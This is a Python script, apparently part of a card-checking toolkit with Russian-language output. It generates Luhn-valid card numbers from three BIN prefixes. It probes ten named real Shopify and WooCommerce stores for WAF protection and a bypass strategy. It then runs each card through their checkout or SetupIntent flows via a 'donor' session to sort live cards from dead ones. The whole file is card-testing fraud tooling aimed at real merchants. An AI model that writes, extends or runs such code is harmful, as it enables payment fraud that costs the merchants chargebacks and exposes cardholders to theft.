# language: Python 3.12+, file: scratch/test_10_stores_3_cards.py, target: Windows 11
import asyncio
import json
import os
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", line_buffering=True)

import gate_client as gc
import shopify_gate as sg
import store_gate as stg
import setup_gate as supg
import surface_shield as ss
import config

TARGETS = [
    ("Shopify", "https://sparkcandles.com", "shopify"),
    ("Shopify", "https://sweetharvestfarms.com", "shopify"),
    ("Shopify", "https://beeyouorganics.com", "shopify"),
    ("Shopify", "https://tasteoftea.com", "shopify"),
    ("Shopify", "https://ontheround.com", "shopify"),
    ("WooCommerce Store API", "https://rocketgeek.com", "store"),
    ("WooCommerce Store API", "https://brentrobitaille.com", "store"),
    ("WooCommerce Store API", "https://specialteacompany.com", "store"),
    ("WooCommerce Store API", "https://yarnstreet.com", "store"),
    ("WooCommerce SetupIntent", "https://www.blackbeltprotein.com.au", "setup"),
]

BINS = ["453927", "448528", "517546"]

def gen_3_cards():
    cards = []
    for prefix in BINS:
        probe = gc.gen_probe_card(prefix)
        cards.append(f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}")
    return cards

async def test_store(platform_name, store_url, gate_type, cards, gs_setup=None):
    print("\n" + "=" * 80)
    print(f"[*] ТЕСТ: {platform_name} | {store_url}")
    print("=" * 80)

    # 1. Запуск Surface Shield Profiler (детект защит)
    t_shield = time.perf_counter()
    shield_prof = await ss.inspect_target(store_url, proxy=None, timeout=10.0)
    shield_ms = int((time.perf_counter() - t_shield) * 1000)
    
    waf = shield_prof.get("waf", "none")
    shields = shield_prof.get("shields", [])
    strategy = shield_prof.get("bypass_strategy", "standard_direct")
    is_blocked = shield_prof.get("is_active_block", False)

    print(f"[SHIELD] WAF: {waf.upper()} (conf={shield_prof.get('waf_confidence', 0):.2f}) | "
          f"Щиты: {shields or 'нет'} | Стратегия: {strategy} | Блок: {is_blocked} ({shield_ms}ms)")

    results = []
    latencies = []
    clean_count = 0
    err_count = 0

    # 2. Прогон 3 карт
    for idx, card in enumerate(cards, 1):
        t0 = time.perf_counter()
        masked = gc.mask_pan(card)
        try:
            if gate_type == "shopify":
                res = await sg.check_target(store_url, card, proxy=None, max_price_cents=2500)
            elif gate_type == "store":
                res = await stg.check_target(store_url, card, None, max_price_cents=2500)
            elif gate_type == "setup":
                res = await gs_setup.check_card(card)
            else:
                res = {"status": "ERROR", "detail": "Unknown gate type"}

            lat_ms = int((time.perf_counter() - t0) * 1000)
            latencies.append(lat_ms)
            st = res.get("status", "UNKNOWN")
            det = res.get("detail", "")
            if st in ("ERROR", "UNKNOWN", "EXCEPTION"):
                err_count += 1
                verdict_flag = "WARN: ERR"
            else:
                clean_count += 1
                verdict_flag = "PASS: CLEAN"

            print(f"  [Карта {idx}/3] {masked} -> {st:16} ({lat_ms}ms) | {verdict_flag} | {det[:70]}")
            results.append({"card": masked, "status": st, "detail": det[:100], "latency_ms": lat_ms})
        except Exception as e:
            lat_ms = int((time.perf_counter() - t0) * 1000)
            err_count += 1
            print(f"  [Карта {idx}/3] {masked} -> EXCEPTION ({lat_ms}ms): {e}")
            results.append({"card": masked, "status": "EXCEPTION", "detail": str(e), "latency_ms": lat_ms})
        await asyncio.sleep(0.6)

    avg_lat = int(sum(latencies) / len(latencies)) if latencies else 0
    return {
        "platform": platform_name,
        "store_url": store_url,
        "gate_type": gate_type,
        "shield": {
            "waf": waf,
            "shields": shields,
            "bypass_strategy": strategy,
            "is_active_block": is_blocked,
            "inspect_latency_ms": shield_ms
        },
        "clean_verdicts": clean_count,
        "errors": err_count,
        "avg_latency_ms": avg_lat,
        "results": results
    }

async def main():
    print("=" * 80)
    print("[*] LIVE MULTI-STORE BENCHMARK: 10 МАГАЗИНОВ x 3 КАРТЫ (30 КАРТ ВСЕГО)")
    print("[*] Режим: Прямое соединение (БЕЗ ПРОКСИ)")
    print("=" * 80)

    cards = gen_3_cards()
    print(f"[*] Сгенерированы тестовые карты (Luhn-valid): {[gc.mask_pan(c) for c in cards]}")

    # Подготовка SetupIntent донора
    ready_list = supg.load_ready_gates()
    gs_setup = supg.GateSession(ready_list[0], proxy=None)
    ok_setup, det_setup = await gs_setup.open()
    print(f"[*] SetupIntent донор открыт: {ok_setup} ({det_setup})")

    all_summaries = []
    for plat, store, gtype in TARGETS:
        summary = await test_store(plat, store, gtype, cards, gs_setup=gs_setup)
        all_summaries.append(summary)

    out_file = os.path.join(str(ROOT), "scratch", "live_10_stores_3_cards_report.json")
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(all_summaries, f, indent=2, ensure_ascii=False)

    print("\n" + "=" * 80)
    print(f"[+] БЕНЧМАРК ЗАВЕРШЕН. Отчет сохранен в: {out_file}")
    print("=" * 80)

if __name__ == "__main__":
    asyncio.run(main())
